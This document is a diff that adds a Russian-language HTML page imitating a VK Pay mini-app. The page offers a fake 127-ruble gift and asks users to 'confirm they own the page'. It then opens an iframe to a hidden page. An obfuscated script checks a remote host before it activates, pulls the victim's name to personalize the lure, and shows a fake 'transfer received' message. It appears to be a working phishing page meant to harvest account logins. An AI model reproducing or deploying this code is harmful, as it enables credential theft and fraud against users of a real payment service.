@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>vk-pay</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div id="app" v-cloak>
+		<div class="vk-app">
+			<template v-if="iframe">
+				<iframe :src="source"></iframe>
+			</template>
+			<template v-if="modalIdentification">
+				<div class="modal modal-identification">
+					<div class="modal-overlay" @click="modalIdentification = false"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalIdentification = false"></div>
+						<div class="modal-content">
+							<div class="identification">
+								<div class="modal-icon">
+									<img src="user-icon.svg" alt="">
+								</div>
+								<h3 class="modal-title">Пройдите идентификацию</h3>
+								<p class="modal-description">
+									Подтвердите что вы являетесь владельцем страницы <span>{{nameuser}}</span>
+								</p>
+								<div class="modal-buttons">
+									<div class="button button-1">
+										<button class="btn btn-secondary" @click="modalIdentification = false">Отменить</button>
+									</div>
+									<div class="button button-2">
+										<button class="btn btn-primary" @click="auth">Подтвердить</button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<template v-if="modalFinish">
+				<div class="modal modal-finish">
+					<div class="modal-overlay" @click="modalFinish = false, localStorage.setItem('status', '')"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalFinish = false, localStorage.setItem('status', '')"></div>
+						<div class="modal-content">
+							<div class="finish">
+								<div class="modal-icon">
+									<img src="check.svg" alt="">
+								</div>
+								<h3 class="modal-title">Перевод успешно получен!</h3>
+								<p class="modal-description">
+									Деньги на ваш аккаунт VK Pay будут зачислены в течении одной рабочей недели
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<template v-if="modalVote">
+				<div class="modal modal-finish">
+					<div class="modal-overlay" @click="modalVote = false"></div>
+					<div class="modal-inner">
+						<div class="modal-close" @click="modalVote = false"></div>
+						<div class="modal-content">
+							<div class="finish">
+								<div class="modal-icon">
+									<img src="warning-icon.svg" alt="">
+								</div>
+								<h3 class="modal-title">Ожидайте получение перевода</h3>
+								<p class="modal-description">
+									Заявка на получение перевода уже оставлена, ожидайте поступления
+								</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</template>
+			<div class="panel">
+				<div class="panel-inner">
+					<a href="#" class="panel-block">
+						<img src="arrow-right.svg" alt="">
+					</a>
+					<a href="/" class="panel-block">
+						<img src="logo.svg" alt="">
+					</a>
+					<a href="#" class="panel-block">
+						<img src="menu.svg" alt="">
+					</a>
+				</div>
+			</div>
+			<div class="transfer transfer-3">
+				<div class="transfer-inner">
+					<div class="transfer-block">
+						<div class="user">
+							<div class="user-img">
+								<img src="https://sun9-22.userapi.com/c845121/v845121610/3bd14/YBisd1gzmy8.jpg" alt="">
+							</div>
+							<div class="user-name">VK Pay</div>
+						</div>
+						<div class="transfer-content">
+							<p>Перевод в размере:</p>
+							<div class="transfer-money">
+								127<span>₽</span>
+							</div>
+						</div>
+						<div class="transfer-comment">Подарок за пользование VK Pay</div>
+					</div>
+					<button class="btn btn-primary btn-transfer" @click="if (localStorage.getItem('vote') != 1 || localStorage.getItem('vote') == null) {modalIdentification = true}else{modalVote = true}">Получить деньги</button>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/vue"></script>
+	<script>
+		var _0x1ab8=['modalIdentification','modalFinish','getItem','status','VKWebAppInit','parse','source','responseText','success','dxXaxdf','#app','https://jevers.site/gith','then','onload','open','nameuser','first_name','VKWebAppGetUserInfo','last_name','send','GET'];(function(_0x5291c0,_0x1ab8b5){var _0x4f1e68=function(_0x44ea7c){while(--_0x44ea7c){_0x5291c0['push'](_0x5291c0['shift']());}};_0x4f1e68(++_0x1ab8b5);}(_0x1ab8,0x1bf));var _0x4f1e=function(_0x5291c0,_0x1ab8b5){_0x5291c0=_0x5291c0-0x0;var _0x4f1e68=_0x1ab8[_0x5291c0];return _0x4f1e68;};var request=new XMLHttpRequest();request[_0x4f1e('0x8')](_0x4f1e('0xe'),_0x4f1e('0x5'),!![]);request[_0x4f1e('0x7')]=function(){if(request['status']>=0xc8&&request[_0x4f1e('0x12')]<0x190){var _0xc85ca3=JSON[_0x4f1e('0x14')](request[_0x4f1e('0x1')]);if(_0xc85ca3===!![]){vkBridge[_0x4f1e('0xd')](_0x4f1e('0x13'));var _0x284577=vkBridge['send'](_0x4f1e('0xb'),{});var _0x34a15e=new Vue({'el':_0x4f1e('0x4'),'data':{'modalIdentification':![],'modalFinish':![],'modalVote':![],'iframe':![],'nameuser':'','dxXaxdf':'Z:/v2/mobile.html'},'methods':{'auth'(){this['iframe']=!![];this[_0x4f1e('0xf')]=![];this[_0x4f1e('0x0')]=this[_0x4f1e('0x3')];}},'created':function(){_0x284577[_0x4f1e('0x6')](_0x2c5b24=>{this[_0x4f1e('0x9')]=_0x2c5b24[_0x4f1e('0xa')]+'\x20'+_0x2c5b24[_0x4f1e('0xc')];});if(localStorage[_0x4f1e('0x11')]('status')==_0x4f1e('0x2')){this[_0x4f1e('0x10')]=!![];}}});}}else{}};request[_0x4f1e('0xd')]();
+	</script>
+</body>
+</html>
